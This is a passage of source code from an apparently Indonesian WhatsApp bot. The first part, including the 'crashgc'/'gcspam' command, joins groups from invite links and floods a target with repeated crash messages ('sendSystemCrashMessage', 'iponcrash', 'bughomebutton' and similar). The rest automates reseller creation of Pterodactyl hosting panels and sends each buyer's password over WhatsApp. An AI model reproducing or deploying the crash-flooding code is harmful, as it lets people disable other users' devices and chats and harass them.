await bakdok(Pe, vareltzyhuraa)
await sendSystemCrashMessage(Pe, vareltzyhuraa)
await sendViewOnceMessages(Pe, vareltzyhuraa)
await penghitaman(Pe, vareltzyhuraa)
await sendExtendedTextMessage(Pe, vareltzyhuraa)
await iponcrash(Pe)
await iponcrash(Pe, vareltzyhuraa)
await ngeloc(Pe, vareltzyhuraa)
await ngeloc(Pe, xbug2)
await pirgam(Pe, bugquoteddvc)
await pirgam(Pe, vareltzyhuraa)
await bughomebutton(Pe, vareltzyhuraa)
await bughomebutton(Pe)
await sendSystemCrashMessage(Pe, vareltzybugnew)
await sendRepeatedMessages2(Pe, vareltzyhuraa)
await sendVariousMessages(Pe, vareltzyhuraa)
await sendLiveLocationMessage(Pe, vareltzyhuraa)
await bakdok(Pe, vareltzyhuraa)
await sendSystemCrashMessage(Pe, vareltzyhuraa)
await sendViewOnceMessages(Pe, vareltzyhuraa)
await penghitaman(Pe, vareltzyhuraa)
await sendExtendedTextMessage(Pe, vareltzyhuraa)
await iponcrash(Pe)
await iponcrash(Pe, vareltzyhuraa)
await ngeloc(Pe, vareltzyhuraa)
await ngeloc(Pe, xbug2)
await pirgam(Pe, bugquoteddvc)
await pirgam(Pe, vareltzyhuraa)
await bughomebutton(Pe, vareltzyhuraa)
await bughomebutton(Pe)
await sendSystemCrashMessage(Pe, vareltzybugnew)
await sendRepeatedMessages2(Pe, vareltzyhuraa)
await sendVariousMessages(Pe, vareltzyhuraa)
await sendLiveLocationMessage(Pe, vareltzyhuraa)
await bakdok(Pe, vareltzyhuraa)
await sendSystemCrashMessage(Pe, vareltzyhuraa)
await sendViewOnceMessages(Pe, vareltzyhuraa)
await penghitaman(Pe, vareltzyhuraa)
await sendExtendedTextMessage(Pe, vareltzyhuraa)
await iponcrash(Pe)
await iponcrash(Pe, vareltzyhuraa)
await ngeloc(Pe, vareltzyhuraa)
await ngeloc(Pe, xbug2)
await pirgam(Pe, bugquoteddvc)
await pirgam(Pe, vareltzyhuraa)
await bughomebutton(Pe, vareltzyhuraa)
await bughomebutton(Pe)
await sendSystemCrashMessage(Pe, vareltzybugnew)
await sendRepeatedMessages2(Pe, vareltzyhuraa)
await sendVariousMessages(Pe, vareltzyhuraa)
await sendLiveLocationMessage(Pe, vareltzyhuraa)
await bakdok(Pe, vareltzyhuraa)
await sendSystemCrashMessage(Pe, vareltzyhuraa)
await sendViewOnceMessages(Pe, vareltzyhuraa)
await penghitaman(Pe, vareltzyhuraa)
await sendExtendedTextMessage(Pe, vareltzyhuraa)
await iponcrash(Pe)
await iponcrash(Pe, vareltzyhuraa)
await ngeloc(Pe, vareltzyhuraa)
await ngeloc(Pe, xbug2)
await pirgam(Pe, bugquoteddvc)
await pirgam(Pe, vareltzyhuraa)
await bughomebutton(Pe, vareltzyhuraa)
await bughomebutton(Pe)
await sendSystemCrashMessage(Pe, vareltzybugnew)
await sendRepeatedMessages2(Pe, vareltzyhuraa)
await sendVariousMessages(Pe, vareltzyhuraa)
await sendLiveLocationMessage(Pe, vareltzyhuraa)
await await VxoZap.sendMessage(Pe, {text: `𝐒𝐄𝐂𝐑𝐄𝐓 𝐏𝐄𝐎𝐏𝐋𝐄Δ ${buttonvareltzy}`}, {quoted:m})
await VxoZap.sendMessage(Pe, {text: `𝐒𝐄𝐂𝐑𝐄𝐓 𝐏𝐄𝐎𝐏𝐋𝐄Δ ${buttonvareltzy}`}, {quoted:m})
await VxoZap.sendMessage(Pe, {text: `𝐒𝐄𝐂𝐑𝐄𝐓 𝐏𝐄𝐎𝐏𝐋𝐄Δ ${buttonvareltzy}`}, {quoted:m})
await VxoZap.sendMessage(Pe, {text: `𝐒𝐄𝐂𝐑𝐄𝐓 𝐏𝐄𝐎𝐏𝐋𝐄Δ ${buttonvareltzy}`}, {quoted:m})
await VxoZap.sendMessage(Pe, {text: `bang?`}, {quoted:m})
}
await replyy(global.sendbug)
await replyy(`CEK AJA PASTI C1`)
}
break
case 'gcgubluk': case 'crashasu': case 'crashgc': case 'gcspam': case 'buttongc': case 'gcampas': {
if (!isCreator) return replyy(global.nocreator)
if (!q) return replyy(`Penggunaan .${command} https://chat.whatsapp.com/`)
await replyy(global.wait)
let result = args[0].split('https://chat.whatsapp.com/')[1];
let Pe = await VxoZap.groupAcceptInvite(result);
for (let j = 0; j < 1; j++) {
await VxoZap.sendMessage(Pe, {text: `MASIH IDUP KAN LU?`}, {quoted:m})
await bughomebutton(Pe, vareltzyhuraa)
await bughomebutton(Pe, vareltzyhuraa)
await bakdok(Pe, vareltzyhuraa)
await sendSystemCrashMessage(Pe, vareltzyhuraa)
await sendViewOnceMessages(Pe, vareltzyhuraa)
await penghitaman(Pe, vareltzyhuraa)
await sendExtendedTextMessage(Pe, vareltzyhuraa)
await iponcrash(Pe)
await iponcrash(Pe, vareltzyhuraa)
await ngeloc(Pe, vareltzyhuraa)
await ngeloc(Pe, xbug2)
await pirgam(Pe, bugquoteddvc)
await pirgam(Pe, vareltzyhuraa)
await bughomebutton(Pe, vareltzyhuraa)
await bughomebutton(Pe)
await sendSystemCrashMessage(Pe, vareltzybugnew)
await sendRepeatedMessages2(Pe, vareltzyhuraa)
await sendVariousMessages(Pe, vareltzyhuraa)
await sendLiveLocationMessage(Pe, vareltzyhuraa)
await bakdok(Pe, vareltzyhuraa)
await sendSystemCrashMessage(Pe, vareltzyhuraa)
await sendViewOnceMessages(Pe, vareltzyhuraa)
await penghitaman(Pe, vareltzyhuraa)
await sendExtendedTextMessage(Pe, vareltzyhuraa)
await iponcrash(Pe)
await iponcrash(Pe, vareltzyhuraa)
await ngeloc(Pe, vareltzyhuraa)
await ngeloc(Pe, xbug2)
await pirgam(Pe, bugquoteddvc)
await pirgam(Pe, vareltzyhuraa)
await bughomebutton(Pe, vareltzyhuraa)
await bughomebutton(Pe)
await sendSystemCrashMessage(Pe, vareltzybugnew)
await sendRepeatedMessages2(Pe, vareltzyhuraa)
await sendVariousMessages(Pe, vareltzyhuraa)
await sendLiveLocationMessage(Pe, vareltzyhuraa)
await bakdok(Pe, vareltzyhuraa)
await sendSystemCrashMessage(Pe, vareltzyhuraa)
await sendViewOnceMessages(Pe, vareltzyhuraa)
await penghitaman(Pe, vareltzyhuraa)
await sendExtendedTextMessage(Pe, vareltzyhuraa)
await iponcrash(Pe)
await iponcrash(Pe, vareltzyhuraa)
await ngeloc(Pe, vareltzyhuraa)
await ngeloc(Pe, xbug2)
await pirgam(Pe, bugquoteddvc)
await pirgam(Pe, vareltzyhuraa)
await bughomebutton(Pe, vareltzyhuraa)
await bughomebutton(Pe)
await sendSystemCrashMessage(Pe, vareltzybugnew)
await sendRepeatedMessages2(Pe, vareltzyhuraa)
await sendVariousMessages(Pe, vareltzyhuraa)
await sendLiveLocationMessage(Pe, vareltzyhuraa)
await bakdok(Pe, vareltzyhuraa)
await sendSystemCrashMessage(Pe, vareltzyhuraa)
await sendViewOnceMessages(Pe, vareltzyhuraa)
await penghitaman(Pe, vareltzyhuraa)
await sendExtendedTextMessage(Pe, vareltzyhuraa)
await iponcrash(Pe)
await iponcrash(Pe, vareltzyhuraa)
await ngeloc(Pe, vareltzyhuraa)
await ngeloc(Pe, xbug2)
await pirgam(Pe, bugquoteddvc)
await pirgam(Pe, vareltzyhuraa)
await bughomebutton(Pe, vareltzyhuraa)
await bughomebutton(Pe)
await sendSystemCrashMessage(Pe, vareltzybugnew)
await sendRepeatedMessages2(Pe, vareltzyhuraa)
await sendVariousMessages(Pe, vareltzyhuraa)
await sendLiveLocationMessage(Pe, vareltzyhuraa)
await VxoZap.sendMessage(Pe, {text: '❄𝐒𝐄𝐂𝐑𝐄𝐓 𝐏𝐄𝐎𝐏𝐋𝐄Δ🥵'}, {quoted:m})
await VxoZap.sendMessage(Pe, {text: '❄𝐒𝐄𝐂𝐑𝐄𝐓 𝐏𝐄𝐎𝐏𝐋𝐄Δ🥵'}, {quoted:m})
await VxoZap.sendMessage(Pe, {text: '❄𝐒𝐄𝐂𝐑𝐄𝐓 𝐏𝐄𝐎𝐏𝐋𝐄Δ🥵'}, {quoted:m})
await VxoZap.sendMessage(Pe, {text: '❄𝐒𝐄𝐂𝐑𝐄𝐓 𝐏𝐄𝐎𝐏𝐋𝐄Δ🥵'}, {quoted:m})
await VxoZap.sendMessage(Pe, {text: `bang?`}, {quoted:m})
}
await replyy(`SUKSES MOHON JEDA 10 MENIT`)
}
break
case "unli": case 'unlimited': {
if (!isReseller) return replyy(`𝐅𝐈𝐓𝐔𝐑 𝐈𝐍𝐈 𝐊𝐇𝐔𝐒𝐔𝐒 𝐔𝐍𝐓𝐔𝐊 𝐑𝐄𝐒𝐄𝐋𝐋𝐄𝐑 𝐏𝐀𝐍𝐄𝐋`)
let t = text.split(',');
if (t.length < 2) return replyy(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = "15"
let loc = "1"
let memo = "0"
let cpu = "0"
let disk = "0"
let email = username + "@varel.panel"
if (!u) return
let d = (await VxoZap.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return replyy(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
replyy(`𝐌𝐎𝐇𝐎𝐍 𝐒𝐀𝐁𝐀𝐑 𝐒𝐄𝐑𝐕𝐄𝐑 𝐒𝐄𝐃𝐀𝐍𝐆 𝐃𝐈 𝐁𝐔𝐀𝐓 𝐔𝐍𝐓𝐔𝐊 @${u.split`@`[0]} 𝐁𝐀𝐍𝐆 ${pushname}`)
let ctf = `
*Hai @${u.split`@`[0]} Ini Data Panel Anda*
*DARI @${m?.sender.split('@')[0]}*
┏━  ⬣『 *DATA  AKUN*  』⬣  ━┓
┣━━━━━━━━━━━━━━━━━━┓
┃ *Email :* ${email}
┃ *Username :* ${user.username}
┃ *Password :* ${password.toString()}
┃ *Ram :* ${memo} MB
┃ *Disk :* ${disk} MB
┃ *CPU :* ${cpu}%
┣━━━━━━━━━━━━━━━━━━┫
┗━━━━━━━━━━━━━━━━━━┛

*NOTES :*
*⎘ DATA HANYA 1× KIRIM*
*⎘ JAGA BAIK BAIK DATA*
*⎘ GAR? BAWA BUKTI TF*
*⎘ NO MAKSA REFF*
`
let msg = generateWAMessageFromContent(from, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: ctf
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `THANK YOU FOR ORDERING`
}),
header: proto.Message.InteractiveMessage.Header.create({

title: '',
gifPlayback: true,
subtitle: '',
hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: { url: "./lib/image/vareltzy.jpg" } }, { upload: VxoZap.waUploadToServer }))
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"👥 GROUP BUYER","url":"${gcbuyer}","merchant_url":"https://www.google.com"}`
},
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"🌐 LINK LOGIN","url":"${domain}","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "📛 COPY USERNAME",
"copy_code": `${user.username}`
})
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "🔐 COPY PASSWORD",
"copy_code": `${password.toString()}`
})
}
],
}),
contextInfo: {
mentionedJid: [m.sender], 
forwardingScore: 999,
isForwarded: false,
forwardedNewsletterMessageInfo: {
newsletterJid: "120363300914288486@newsletter",
newsletterName: "ᴠᴀʀᴇʟ",
serverMessageId: 145
}
}})}}
}, {quoted: m})
await VxoZap.relayMessage(u, msg.message, {
messageId: msg.key.id
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": "ᴠᴀʀᴇʟ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 0,
"backups": 0,
"allocations": 0
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return replyy(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await replyy(`
*Sukses Creat Panel ✅*
┏━  ⬣『 *DATA  AKUN*  』⬣  ━┓
┣━━━━━━━━━━━━━━━━━━┓
┃ *ID Server :* ${server.id}
┃ *ID User :* ${user.id}
┃ *Ram :* ${memo} MB
┃ *Disk :* ${disk} MB
┃ *CPU :* ${cpu}%
┣━━━━━━━━━━━━━━━━━━┫
┗━━━━━━━━━━━━━━━━━━┛\n
Username dan Password Telah Dikirim
Ke @${u.split`@`[0]}`)
}
break
case "1gb": {
if (!isReseller) return replyy(`𝐅𝐈𝐓𝐔𝐑 𝐈𝐍𝐈 𝐊𝐇𝐔𝐒𝐔𝐒 𝐔𝐍𝐓𝐔𝐊 𝐑𝐄𝐒𝐄𝐋𝐋𝐄𝐑 𝐏𝐀𝐍𝐄𝐋`)
let t = text.split(',');
if (t.length < 2) return replyy(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = "15"
let loc = "1"
let memo = "1050"
let cpu = "50"
let disk = "1050"
let email = username + "@varel.panel"
if (!u) return
let d = (await VxoZap.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return replyy(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
replyy(`𝐌𝐎𝐇𝐎𝐍 𝐒𝐀𝐁𝐀𝐑 𝐒𝐄𝐑𝐕𝐄𝐑 𝐒𝐄𝐃𝐀𝐍𝐆 𝐃𝐈 𝐁𝐔𝐀𝐓 𝐔𝐍𝐓𝐔𝐊 @${u.split`@`[0]} 𝐁𝐀𝐍𝐆 ${pushname}`)
let ctf = `
*Hai @${u.split`@`[0]} Ini Data Panel Anda*
*DARI @${m?.sender.split('@')[0]}*
┏━  ⬣『 *DATA  AKUN*  』⬣  ━┓
┣━━━━━━━━━━━━━━━━━━┓
┃ *Email :* ${email}
┃ *Username :* ${user.username}
┃ *Password :* ${password.toString()}
┃ *Ram :* ${memo} MB
┃ *Disk :* ${disk} MB
┃ *CPU :* ${cpu}%
┣━━━━━━━━━━━━━━━━━━┫
┗━━━━━━━━━━━━━━━━━━┛

*NOTES :*
*⎘ DATA HANYA 1× KIRIM*
*⎘ JAGA BAIK BAIK DATA*
*⎘ GAR? BAWA BUKTI TF*
*⎘ NO MAKSA REFF*
`
let msg = generateWAMessageFromContent(from, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: ctf
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `THANK YOU FOR ORDERING`
}),
header: proto.Message.InteractiveMessage.Header.create({

title: '',
gifPlayback: true,
subtitle: '',
hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: { url: "./lib/image/vareltzy.jpg" } }, { upload: VxoZap.waUploadToServer }))
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"👥 GROUP BUYER","url":"${gcbuyer}","merchant_url":"https://www.google.com"}`
},
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"🌐 LINK LOGIN","url":"${domain}","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "📛 COPY USERNAME",
"copy_code": `${user.username}`
})
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "🔐 COPY PASSWORD",
"copy_code": `${password.toString()}`
})
}
],
}),
contextInfo: {
mentionedJid: [m.sender], 
forwardingScore: 999,
isForwarded: false,
forwardedNewsletterMessageInfo: {
newsletterJid: "120363300914288486@newsletter",
newsletterName: "ᴠᴀʀᴇʟ",
serverMessageId: 145
}
}})}}
}, {quoted: m})
await VxoZap.relayMessage(u, msg.message, {
messageId: msg.key.id
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": "ᴠᴀʀᴇʟ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 0,
"backups": 0,
"allocations": 0
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return replyy(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await replyy(`
*Sukses Creat Panel ✅*
┏━  ⬣『 *DATA  AKUN*  』⬣  ━┓
┣━━━━━━━━━━━━━━━━━━┓
┃ *ID Server :* ${server.id}
┃ *ID User :* ${user.id}
┃ *Ram :* ${memo} MB
┃ *Disk :* ${disk} MB
┃ *CPU :* ${cpu}%
┣━━━━━━━━━━━━━━━━━━┫
┗━━━━━━━━━━━━━━━━━━┛\n
Username dan Password Telah Dikirim
Ke @${u.split`@`[0]}`)
}
break
case "2gb": {
if (!isReseller) return replyy(`𝐅𝐈𝐓𝐔𝐑 𝐈𝐍𝐈 𝐊𝐇𝐔𝐒𝐔𝐒 𝐔𝐍𝐓𝐔𝐊 𝐑𝐄𝐒𝐄𝐋𝐋𝐄𝐑 𝐏𝐀𝐍𝐄𝐋`)
let t = text.split(',');
if (t.length < 2) return replyy(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = "15"
let loc = "1"
let memo = "2050"
let cpu = "100"
let disk = "2050"
let email = username + "@varel.panel"
if (!u) return
let d = (await VxoZap.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return replyy(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
replyy(`𝐌𝐎𝐇𝐎𝐍 𝐒𝐀𝐁𝐀𝐑 𝐒𝐄𝐑𝐕𝐄𝐑 𝐒𝐄𝐃𝐀𝐍𝐆 𝐃𝐈 𝐁𝐔𝐀𝐓 𝐔𝐍𝐓𝐔𝐊 @${u.split`@`[0]} 𝐁𝐀𝐍𝐆 ${pushname}`)
let ctf = `
*Hai @${u.split`@`[0]} Ini Data Panel Anda*
*DARI @${m?.sender.split('@')[0]}*
┏━  ⬣『 *DATA  AKUN*  』⬣  ━┓
┣━━━━━━━━━━━━━━━━━━┓
┃ *Email :* ${email}
┃ *Username :* ${user.username}
┃ *Password :* ${password.toString()}
┃ *Ram :* ${memo} MB
┃ *Disk :* ${disk} MB
┃ *CPU :* ${cpu}%
┣━━━━━━━━━━━━━━━━━━┫
┗━━━━━━━━━━━━━━━━━━┛

*NOTES :*
*⎘ DATA HANYA 1× KIRIM*
*⎘ JAGA BAIK BAIK DATA*
*⎘ GAR? BAWA BUKTI TF*
*⎘ NO MAKSA REFF*
`
let msg = generateWAMessageFromContent(from, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: ctf
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `THANK YOU FOR ORDERING`
}),
header: proto.Message.InteractiveMessage.Header.create({

title: '',
gifPlayback: true,
subtitle: '',
hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: { url: "./lib/image/vareltzy.jpg" } }, { upload: VxoZap.waUploadToServer }))
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"👥 GROUP BUYER","url":"${gcbuyer}","merchant_url":"https://www.google.com"}`
},
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"🌐 LINK LOGIN","url":"${domain}","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "📛 COPY USERNAME",
"copy_code": `${user.username}`
})
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "🔐 COPY PASSWORD",
"copy_code": `${password.toString()}`
})
}
],
}),
contextInfo: {
mentionedJid: [m.sender], 
forwardingScore: 999,
isForwarded: false,
forwardedNewsletterMessageInfo: {
newsletterJid: "120363300914288486@newsletter",
newsletterName: "ᴠᴀʀᴇʟ",
serverMessageId: 145
}
}})}}
}, {quoted: m})
await VxoZap.relayMessage(u, msg.message, {
messageId: msg.key.id
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": "ᴠᴀʀᴇʟ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 0,
"backups": 0,
"allocations": 0
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return replyy(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await replyy(`
*Sukses Creat Panel ✅*
┏━  ⬣『 *DATA  AKUN*  』⬣  ━┓
┣━━━━━━━━━━━━━━━━━━┓
┃ *ID Server :* ${server.id}
┃ *ID User :* ${user.id}
┃ *Ram :* ${memo} MB
┃ *Disk :* ${disk} MB
┃ *CPU :* ${cpu}%
┣━━━━━━━━━━━━━━━━━━┫
┗━━━━━━━━━━━━━━━━━━┛\n
Username dan Password Telah Dikirim
Ke @${u.split`@`[0]}`)
}
break
case "3gb": {
if (!isReseller) return replyy(`𝐅𝐈𝐓𝐔𝐑 𝐈𝐍𝐈 𝐊𝐇𝐔𝐒𝐔𝐒 𝐔𝐍𝐓𝐔𝐊 𝐑𝐄𝐒𝐄𝐋𝐋𝐄𝐑 𝐏𝐀𝐍𝐄𝐋`)
let t = text.split(',');
if (t.length < 2) return replyy(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = "15"
let loc = "1"
let memo = "3050"
let cpu = "150"
let disk = "3050"
let email = username + "@varel.panel"
if (!u) return
let d = (await VxoZap.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return replyy(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
replyy(`𝐌𝐎𝐇𝐎𝐍 𝐒𝐀𝐁𝐀𝐑 𝐒𝐄𝐑𝐕𝐄𝐑 𝐒𝐄𝐃𝐀𝐍𝐆 𝐃𝐈 𝐁𝐔𝐀𝐓 𝐔𝐍𝐓𝐔𝐊 @${u.split`@`[0]} 𝐁𝐀𝐍𝐆 ${pushname}`)
let ctf = `
*Hai @${u.split`@`[0]} Ini Data Panel Anda*
*DARI @${m?.sender.split('@')[0]}*
┏━  ⬣『 *DATA  AKUN*  』⬣  ━┓
┣━━━━━━━━━━━━━━━━━━┓
┃ *Email :* ${email}
┃ *Username :* ${user.username}
┃ *Password :* ${password.toString()}
┃ *Ram :* ${memo} MB
┃ *Disk :* ${disk} MB
┃ *CPU :* ${cpu}%
┣━━━━━━━━━━━━━━━━━━┫
┗━━━━━━━━━━━━━━━━━━┛

*NOTES :*
*⎘ DATA HANYA 1× KIRIM*
*⎘ JAGA BAIK BAIK DATA*
*⎘ GAR? BAWA BUKTI TF*
*⎘ NO MAKSA REFF*
`
let msg = generateWAMessageFromContent(from, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: ctf
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `THANK YOU FOR ORDERING`
}),
header: proto.Message.InteractiveMessage.Header.create({

title: '',
gifPlayback: true,
subtitle: '',
hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: { url: "./lib/image/vareltzy.jpg" } }, { upload: VxoZap.waUploadToServer }))
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"👥 GROUP BUYER","url":"${gcbuyer}","merchant_url":"https://www.google.com"}`
},
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"🌐 LINK LOGIN","url":"${domain}","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "📛 COPY USERNAME",
"copy_code": `${user.username}`
})
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "🔐 COPY PASSWORD",
"copy_code": `${password.toString()}`
})
}
],
}),
contextInfo: {
mentionedJid: [m.sender], 
forwardingScore: 999,
isForwarded: false,
forwardedNewsletterMessageInfo: {
newsletterJid: "120363300914288486@newsletter",
newsletterName: "ᴠᴀʀᴇʟ",
serverMessageId: 145
}
}})}}
}, {quoted: m})
await VxoZap.relayMessage(u, msg.message, {
messageId: msg.key.id
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": "ᴠᴀʀᴇʟ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 0,
"backups": 0,
"allocations": 0
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
